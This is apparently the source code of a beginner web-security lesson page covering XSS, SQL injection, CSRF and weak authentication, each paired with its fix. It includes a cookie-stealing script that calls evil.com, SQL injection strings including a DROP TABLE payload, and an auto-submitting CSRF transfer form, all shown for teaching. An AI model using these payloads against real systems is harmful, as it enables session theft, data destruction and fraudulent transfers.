"use client";

import LessonShell, {
  Section,
  P,
  Code,
  Inline,
  SubHeading,
} from "../../../../components/LessonShell";

export default function WebSecurityLessonPage() {
  return (
    <LessonShell
      kicker="Lesson · Unit 3 · 9 min read"
      titleMain="Web security 101,"
      titleAccent="the four mistakes that break most apps."
      subtitle="You can't ship a web app without thinking about security. Four classic categories of attack cover most real-world breaches. Here's what each one is, how it works, and the simple patterns that defeat it."
      backHref="/learn/web/unit-3"
      backLabel="Unit 3 · Scripting & Storage"
      learnHref="/learn/web"
      attribution={null}
      prevLesson={{
        label: "Database basics",
        href: "/learn/web/lessons/databases-basics",
      }}
    >
      <Section title="The threat model" sectionNumber="01">
        <P>
          A few baseline assumptions before we begin:
        </P>
        <Code>{`1. Anyone can read your client code.
2. Anyone can craft any HTTP request and send it to your server.
3. Anyone can submit any text as input — including HTML, JS, SQL.
4. The user's browser may have a malicious extension or compromised JS running.
5. Your CDN, third-party scripts, and dependencies can also be compromised.`}</Code>
        <P>
          Security is about making the cost of attack exceed the value
          of the target. You can&rsquo;t be invulnerable. You can be
          much harder than the next guy.
        </P>
      </Section>

      <Section title="XSS — Cross-Site Scripting" sectionNumber="02">
        <P>
          <strong>XSS</strong> happens when an attacker gets their
          JavaScript to run inside your page — usually by submitting it
          as a comment, profile field, or URL parameter and you
          rendering it without escaping.
        </P>
        <Code>{`// User submits this as their "bio":
<script>fetch("https://evil.com/?c=" + document.cookie)</script>

// Your code:
profileDiv.innerHTML = user.bio;   // ← BOOM. Their script runs on your page.`}</Code>
        <SubHeading className="mt-6">The fix</SubHeading>
        <Code>{`profileDiv.textContent = user.bio;   // safe — treats it as plain text

// Or in a template engine / React, output user content as text by default:
<div>{user.bio}</div>                // React escapes this automatically`}</Code>
        <P>
          Two more layers of defense: serve a{" "}
          <strong>Content-Security-Policy</strong> header that restricts
          where scripts can come from, and put session cookies behind{" "}
          <Inline>HttpOnly</Inline> so even successful XSS can&rsquo;t
          steal them.
        </P>
      </Section>

      <Section title="SQL injection" sectionNumber="03">
        <P>
          <strong>SQL injection</strong> happens when user input gets
          concatenated into a SQL query and changes the query&rsquo;s
          structure.
        </P>
        <Code>{`// VULNERABLE
const query = "SELECT * FROM users WHERE email = '" + email + "'";

// Attacker submits: '  OR '1'='1
// Becomes: SELECT * FROM users WHERE email = '' OR '1'='1'
// Returns every user.

// Worse: '; DROP TABLE users; --
// Becomes: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'`}</Code>
        <SubHeading className="mt-6">The fix — parameterized queries, always</SubHeading>
        <Code>{`// Safe — input is passed separately, can't change query structure
const result = await pool.query(
  "SELECT * FROM users WHERE email = $1",
  [email]
);

// Or via an ORM:
await prisma.user.findUnique({ where: { email } });   // safe by construction`}</Code>
        <P>
          The rule is mechanical: <em>never</em> build SQL by string
          concatenation with user input. Parameterized queries cost
          nothing, support every database, and prevent the entire class
          of attack.
        </P>
      </Section>

      <Section title="CSRF — Cross-Site Request Forgery" sectionNumber="04">
        <P>
          <strong>CSRF</strong> attacks abuse the fact that browsers
          automatically send your cookies with every request to your
          domain — even requests initiated from another site.
        </P>
        <Code>{`Attacker hosts evil.com with a hidden form:

  <form action="https://yourbank.com/transfer" method="POST">
    <input name="to" value="attacker_account" />
    <input name="amount" value="10000" />
  </form>
  <script>document.forms[0].submit()</script>

A victim who is logged into yourbank.com visits evil.com.
The form auto-submits.
The browser sends their bank cookie along.
The bank does the transfer.`}</Code>
        <SubHeading className="mt-6">The fixes</SubHeading>
        <Code>{`SameSite=Lax (or Strict) on session cookies — defeats almost all CSRF in modern browsers.
CSRF tokens — embed a random token in every form; server verifies it.
Check the Origin / Referer header on state-changing requests.`}</Code>
        <P>
          <Inline>SameSite=Lax</Inline> alone defeats most CSRF — it
          tells the browser to send the cookie only on top-level
          navigations from your site, not from third-party forms. Use
          tokens too if you&rsquo;re storing money or anything
          irreversible.
        </P>
      </Section>

      <Section title="Broken auth & weak passwords" sectionNumber="05">
        <Code>{`Common failures:

- Storing passwords in plaintext (yes, this still happens)
- Storing passwords as MD5 or SHA1 (fast hashes; crackable in seconds)
- Not rate-limiting login attempts (lets attackers try millions of passwords)
- Long-lived sessions with no logout-everywhere option
- No multi-factor authentication option`}</Code>
        <SubHeading className="mt-6">The fixes</SubHeading>
        <Code>{`Hashing — use bcrypt, argon2, or scrypt. Never MD5/SHA1/SHA256 directly.
Rate limit — 5 wrong attempts → 15-minute lockout, or exponential backoff.
Session expiration — sessions should expire (and rotate on privilege escalation).
2FA — TOTP (Authy, Google Authenticator) for any account that matters.
Use a battle-tested auth library — don't roll your own. Auth.js, Clerk, Supabase Auth, Lucia.`}</Code>
      </Section>

      <Section title="The shortlist of what else to do" sectionNumber="06">
        <Code>{`Always:
  HTTPS on everything (Let's Encrypt is free)
  Secure HttpOnly SameSite cookies for sessions
  Parameterized queries
  Escape output (textContent / framework defaults)
  Rate-limit auth endpoints
  Hash passwords with bcrypt/argon2
  Validate input on the server
  Keep dependencies updated (npm audit, dependabot)

Worth setting up:
  Content-Security-Policy header
  HSTS header (force HTTPS for a year)
  X-Frame-Options: DENY (prevents clickjacking)
  Logging + alerting on suspicious activity
  A way to revoke individual sessions

When you grow:
  Penetration tests
  Bug bounty program
  WAF (Web Application Firewall)
  Regular dependency + secrets audits`}</Code>
      </Section>

      <Section title="What's next" sectionNumber="07">
        <P>
          You now have the foundation for everything else in web
          development. Frameworks, build tools, accessibility audits,
          performance tuning, infrastructure — they&rsquo;re all just
          deeper variants of what you&rsquo;ve already touched.
        </P>
        <P>
          The next step isn&rsquo;t another tutorial. Pick a project —
          a personal site, a tool you wish existed, a clone of
          something you use — and build it. You will get stuck. You
          will Google things. You will read other people&rsquo;s code.
          That&rsquo;s the work. Don&rsquo;t skip it. Go build.
        </P>
      </Section>
    </LessonShell>
  );
}
